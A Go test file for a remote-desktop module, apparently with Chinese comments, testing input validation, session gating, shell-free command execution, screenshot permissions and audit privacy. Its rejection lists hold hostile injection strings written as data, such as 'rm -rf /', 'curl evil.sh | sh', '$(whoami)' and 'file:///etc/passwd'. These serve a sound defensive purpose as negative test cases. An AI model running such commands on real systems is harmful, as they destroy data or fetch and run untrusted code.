package remotedesk

import (
	"context"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// ── 纯函数校验 ──────────────────────────────────────────────────

func TestValidateAppNameRejectsInjection(t *testing.T) {
	bad := []string{
		"",
		"   ",
		"-g",
		"-a Calculator",
		"Finder; rm -rf /",
		"Finder && curl evil.sh | sh",
		"a|b",
		"a&b",
		"$(whoami)",
		"`whoami`",
		"a$(id)",
		"a>b",
		"a<b",
		"a\"b",
		"a'b",
		"a\nb",
		"a\tb",
		"a*b",
		"/Applications/Calculator.app", // 不许传路径（能启动任意 bundle）
		"../evil",
		"~/evil.app",
		strings.Repeat("A", 200), // 过长
	}
	for _, name := range bad {
		if _, err := validateAppName(name); err == nil {
			t.Fatalf("应用名 %q 应被拒绝", name)
		} else if !errors.Is(err, ErrDenied) {
			t.Fatalf("应用名 %q 应返回 ErrDenied，实际 %v", name, err)
		}
	}

	good := []string{"Finder", "Visual Studio Code", "计算器", "Terminal 2"}
	for _, name := range good {
		got, err := validateAppName(name)
		if err != nil {
			t.Fatalf("应用名 %q 应放行，实际 %v", name, err)
		}
		if got != name {
			t.Fatalf("应用名不该被改写: %q -> %q", name, got)
		}
	}
}

func TestValidateURLOnlyHTTP(t *testing.T) {
	bad := []string{
		"",
		"file:///etc/passwd",
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"ftp://example.com/a",
		"smb://host/share",
		"example.com",
		"http://",
	}
	for _, u := range bad {
		if _, err := validateURL(u); err == nil {
			t.Fatalf("url %q 应被拒绝", u)
		}
	}
	good := map[string]string{
		"https://example.com/a?b=1":   "https://example.com/a?b=1",
		"  http://127.0.0.1:7788/x  ": "http://127.0.0.1:7788/x",
		"HTTPS://Example.com/Path":    "https://Example.com/Path",
	}
	for in, want := range good {
		got, err := validateURL(in)
		if err != nil {
			t.Fatalf("url %q 应放行，实际 %v", in, err)
		}
		if got != want {
			t.Fatalf("url 归一化不符：%q -> %q（期望 %q）", in, got, want)
		}
	}
}

// ── 会话门禁 ────────────────────────────────────────────────────

func TestRunActionRejectsUnknownAction(t *testing.T) {
	env := r1Open(t, nil)
	ctx := context.Background()
	d := r1Pair(t, env.m, "t1", "u1", "Mac")
	s := r1ActiveSession(t, env, d.ID)

	_, err := env.m.RunAction(ctx, ActionRequest{
		SessionID: s.ID, Action: "open_terminal_and_type", TenantID: "t1", UserID: "u1",
	})
	if !errors.Is(err, ErrDenied) {
		t.Fatalf("未实现的动作必须拒绝（不给「顺手加个 exec」留口子），实际 %v", err)
	}
}

func TestRunActionRejectsNonActiveSession(t *testing.T) {
	env := r1Open(t, nil)
	ctx := context.Background()
	d := r1Pair(t, env.m, "t1", "u1", "Mac")

	pend, err := env.m.StartSession(ctx, StartRequest{TenantID: "t1", UserID: "u1", DeviceID: d.ID, Mode: ModeControl})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := env.m.RunAction(ctx, ActionRequest{SessionID: pend.ID, Action: ActionLock, TenantID: "t1", UserID: "u1"}); !errors.Is(err, ErrDenied) {
		t.Fatalf("未批准的会话不能执行快捷操作，应 ErrDenied，实际 %v", err)
	}

	if err := env.m.EndSession(ctx, "t1", pend.ID, ReasonUserEnded); err != nil {
		t.Fatal(err)
	}
	if _, err := env.m.RunAction(ctx, ActionRequest{SessionID: pend.ID, Action: ActionLock, TenantID: "t1", UserID: "u1"}); !errors.Is(err, ErrNotFound) {
		t.Fatalf("已结束的会话按不存在处理，实际 %v", err)
	}

	active := r1ActiveSession(t, env, d.ID)
	if _, err := env.m.RunAction(ctx, ActionRequest{SessionID: active.ID, Action: ActionLock, TenantID: "t2", UserID: "u1"}); !errors.Is(err, ErrNotFound) {
		t.Fatalf("跨租户执行动作应 ErrNotFound，实际 %v", err)
	}
	if _, err := env.m.RunAction(ctx, ActionRequest{SessionID: active.ID, Action: ActionLock, TenantID: "t1", UserID: "u2"}); !errors.Is(err, ErrNotFound) {
		t.Fatalf("跨用户执行动作应 ErrNotFound，实际 %v", err)
	}
}

// ── 真实执行路径（用替换后的 execCommand 观察参数，不真的启动 App / 熄屏）──

type r1Call struct {
	name string
	args []string
}

func r1Record(t *testing.T) *[]r1Call {
	t.Helper()
	orig := execCommand
	calls := make([]r1Call, 0, 4)
	execCommand = func(ctx context.Context, name string, args ...string) *exec.Cmd {
		calls = append(calls, r1Call{name: name, args: append([]string(nil), args...)})
		return exec.CommandContext(ctx, "/usr/bin/true")
	}
	t.Cleanup(func() { execCommand = orig })
	return &calls
}

func TestRunActionOpenAppPassesArgsWithoutShell(t *testing.T) {
	// Linux CI 上没有 gtk-launch（也没有桌面环境），这条只能在本机/有桌面的
	// 环境跑；argv 的纯逻辑由 TestAppLaunchArgv 兜住。
	if runtime.GOOS == "linux" {
		if _, err := exec.LookPath("gtk-launch"); err != nil {
			t.Skip("无 gtk-launch（CI runner 没有桌面环境）")
		}
	}
	env := r1Open(t, nil)
	ctx := context.Background()
	d := r1Pair(t, env.m, "t1", "u1", "Mac")
	s := r1ActiveSession(t, env, d.ID)
	calls := r1Record(t)

	res, err := env.m.RunAction(ctx, ActionRequest{
		SessionID: s.ID, Action: ActionOpenApp,
		Args:     map[string]string{"name": "Visual Studio Code"},
		TenantID: "t1", UserID: "u1",
	})
	if err != nil {
		t.Fatalf("open_app 失败: %v", err)
	}
	if !res.OK {
		t.Fatal("res.OK 应为 true")
	}
	if len(*calls) != 1 {
		t.Fatalf("应只执行一条命令，实际 %d", len(*calls))
	}
	call := (*calls)[0]
	switch runtime.GOOS {
	case "darwin":
		if call.name != "open" {
			t.Fatalf("macOS 应用 open 启动，实际 %q", call.name)
		}
		if len(call.args) != 2 || call.args[0] != "-a" || call.args[1] != "Visual Studio Code" {
			t.Fatalf("参数应严格是 [-a 应用名]，实际 %q", call.args)
		}
	case "linux":
		if call.name != "gtk-launch" || len(call.args) != 1 || call.args[0] != "Visual Studio Code" {
			t.Fatalf("Linux 应 gtk-launch <name>，实际 %q %q", call.name, call.args)
		}
	}

	// 注入字符必须在执行前就被拒，命令一次都不许发出去。
	*calls = (*calls)[:0]
	for _, evil := range []string{"Finder; rm -rf /", "$(id)", "-g", "/bin/sh"} {
		if _, err := env.m.RunAction(ctx, ActionRequest{
			SessionID: s.ID, Action: ActionOpenApp,
			Args:     map[string]string{"name": evil},
			TenantID: "t1", UserID: "u1",
		}); !errors.Is(err, ErrDenied) {
			t.Fatalf("注入名 %q 应 ErrDenied，实际 %v", evil, err)
		}
	}
	if len(*calls) != 0 {
		t.Fatalf("被拒的请求不该执行任何命令，实际 %q", *calls)
	}
}

func TestRunActionOpenURLValidatesScheme(t *testing.T) {
	env := r1Open(t, nil)
	ctx := context.Background()
	d := r1Pair(t, env.m, "t1", "u1", "Mac")
	s := r1ActiveSession(t, env, d.ID)
	calls := r1Record(t)

	res, err := env.m.RunAction(ctx, ActionRequest{
		SessionID: s.ID, Action: ActionOpenURL,
		Args:     map[string]string{"url": "https://example.com/a?b=1"},
		TenantID: "t1", UserID: "u1",
	})
	if err != nil {
		t.Fatalf("open_url 失败: %v", err)
	}
	if !res.OK || len(*calls) != 1 {
		t.Fatalf("应执行一条命令，实际 %+v", *calls)
	}
	call := (*calls)[0]
	if len(call.args) != 1 || call.args[0] != "https://example.com/a?b=1" {
		t.Fatalf("url 应作为单个参数传给 open，实际 %q %q", call.name, call.args)
	}

	*calls = (*calls)[:0]
	for _, evil := range []string{"javascript:alert(1)", "file:///etc/passwd", "data:text/html,x"} {
		if _, err := env.m.RunAction(ctx, ActionRequest{
			SessionID: s.ID, Action: ActionOpenURL,
			Args:     map[string]string{"url": evil},
			TenantID: "t1", UserID: "u1",
		}); !errors.Is(err, ErrDenied) {
			t.Fatalf("危险 scheme %q 应 ErrDenied，实际 %v", evil, err)
		}
	}
	if len(*calls) != 0 {
		t.Fatalf("被拒的 url 不该执行命令，实际 %q", *calls)
	}
}

func TestRunActionLockUsesPlatformCommand(t *testing.T) {
	env := r1Open(t, nil)
	ctx := context.Background()
	d := r1Pair(t, env.m, "t1", "u1", "Mac")
	s := r1ActiveSession(t, env, d.ID)
	calls := r1Record(t)

	if _, err := env.m.RunAction(ctx, ActionRequest{SessionID: s.ID, Action: ActionLock, TenantID: "t1", UserID: "u1"}); err != nil {
		t.Fatalf("lock 失败: %v", err)
	}
	if len(*calls) != 1 {
		t.Fatalf("应执行一条命令，实际 %d", len(*calls))
	}
	call := (*calls)[0]
	switch runtime.GOOS {
	case "darwin":
		if call.name != "pmset" || len(call.args) != 1 || call.args[0] != "displaysleepnow" {
			t.Fatalf("macOS 锁屏应 pmset displaysleepnow，实际 %q %q", call.name, call.args)
		}
	case "linux":
		if call.name != "loginctl" || len(call.args) != 1 || call.args[0] != "lock-session" {
			t.Fatalf("Linux 锁屏应 loginctl lock-session，实际 %q %q", call.name, call.args)
		}
	default:
		t.Skip("该平台不支持快捷操作")
	}
}

func TestRunActionScreenshotWritesFile(t *testing.T) {
	env := r1Open(t, nil)
	ctx := context.Background()
	d := r1Pair(t, env.m, "t1", "u1", "Mac")
	s := r1ActiveSession(t, env, d.ID)

	res, err := env.m.RunAction(ctx, ActionRequest{SessionID: s.ID, Action: ActionScreenshot, TenantID: "t1", UserID: "u1"})
	if err != nil {
		t.Fatalf("screenshot 失败: %v", err)
	}
	if res.Path == "" {
		t.Fatal("截图必须返回落盘路径")
	}
	if !strings.Contains(res.Path, string(filepath.Separator)+"remote"+string(filepath.Separator)+"shots"+string(filepath.Separator)) {
		t.Fatalf("截图应落在 <dataDir>/remote/shots，实际 %s", res.Path)
	}
	if !strings.HasSuffix(res.Path, ".jpg") {
		t.Fatalf("截图应是 jpg，实际 %s", res.Path)
	}
	fi, err := os.Stat(res.Path)
	if err != nil {
		t.Fatalf("截图文件不存在: %v", err)
	}
	if fi.Size() == 0 {
		t.Fatal("截图文件为空")
	}
	if perm := fi.Mode().Perm(); perm != 0o600 {
		t.Fatalf("截图权限应为 0600（可能是隐私画面），实际 %04o", perm)
	}

	// 连点两次不覆盖。
	time.Sleep(5 * time.Millisecond)
	res2, err := env.m.RunAction(ctx, ActionRequest{SessionID: s.ID, Action: ActionScreenshot, TenantID: "t1", UserID: "u1"})
	if err != nil {
		t.Fatal(err)
	}
	if res2.Path == res.Path {
		t.Fatalf("两次截图不该写到同一个文件: %s", res.Path)
	}

	// 审计只记动作，不记参数（url/App 名可能含隐私）。
	ev, ok := env.aud.find("remote.action")
	if !ok {
		t.Fatal("缺少 remote.action 审计")
	}
	if ev.Detail["action"] != ActionScreenshot {
		t.Fatalf("审计应记动作名，实际 %v", ev.Detail["action"])
	}
	for _, k := range []string{"url", "name", "path"} {
		if _, leaked := ev.Detail[k]; leaked {
			t.Fatalf("审计 detail 不该带 %s（隐私）", k)
		}
	}
}

func TestRunActionScreenshotUnavailableCapture(t *testing.T) {
	env := r1Open(t, func(c *Config) {
		c.Capture = func(Config) (Capture, error) {
			return &r1Capture{available: false, reason: "缺少屏幕录制权限"}, nil
		}
	})
	ctx := context.Background()
	d := r1Pair(t, env.m, "t1", "u1", "Mac")
	// 会话建不起来（抓屏不可用），直接构造一条 active 会话验证动作路径的报错。
	env.m.mu.Lock()
	sess := &Session{
		ID: "sess_manual", TenantID: "t1", UserID: "u1", DeviceID: d.ID,
		Mode: ModeView, Status: StatusActive, CreatedAt: time.Now(), ExpiresAt: time.Now().Add(time.Hour),
	}
	env.m.sessions[sess.ID] = sess
	env.m.mu.Unlock()

	_, err := env.m.RunAction(ctx, ActionRequest{SessionID: sess.ID, Action: ActionScreenshot, TenantID: "t1", UserID: "u1"})
	if !errors.Is(err, ErrUnavailable) {
		t.Fatalf("抓屏不可用时 screenshot 应 ErrUnavailable，实际 %v", err)
	}
	if !strings.Contains(err.Error(), "缺少屏幕录制权限") {
		t.Fatalf("错误应带后端原因，实际 %v", err)
	}
}

// r1ActiveSession 建一条 view 会话（免批，直接 active）。
func r1ActiveSession(t *testing.T, env *r1Env, deviceID string) Session {
	t.Helper()
	s, err := env.m.StartSession(context.Background(), StartRequest{
		TenantID: "t1", UserID: "u1", DeviceID: deviceID, Mode: ModeView,
	})
	if err != nil {
		t.Fatalf("建会话失败: %v", err)
	}
	return s
}

// 纯逻辑：应用名只作为一个 argv，永不被 shell 解释。
func TestAppLaunchArgv(t *testing.T) {
	cases := []struct {
		goos, app, bin string
		args           []string
	}{
		{"darwin", "Visual Studio Code", "open", []string{"-a", "Visual Studio Code"}},
		{"darwin", "Terminal; rm -rf ~", "open", []string{"-a", "Terminal; rm -rf ~"}},
		{"linux", "code", "gtk-launch", []string{"code"}},
	}
	for _, c := range cases {
		bin, args, err := appLaunchArgv(c.goos, c.app)
		if err != nil {
			t.Fatalf("%s/%s: %v", c.goos, c.app, err)
		}
		if bin != c.bin || len(args) != len(c.args) || args[len(args)-1] != c.args[len(c.args)-1] {
			t.Fatalf("%s/%s: 得到 %s %v，期望 %s %v", c.goos, c.app, bin, args, c.bin, c.args)
		}
	}
	if _, _, err := appLaunchArgv("windows", "cmd"); err == nil {
		t.Fatal("不支持的平台应报错")
	}
}
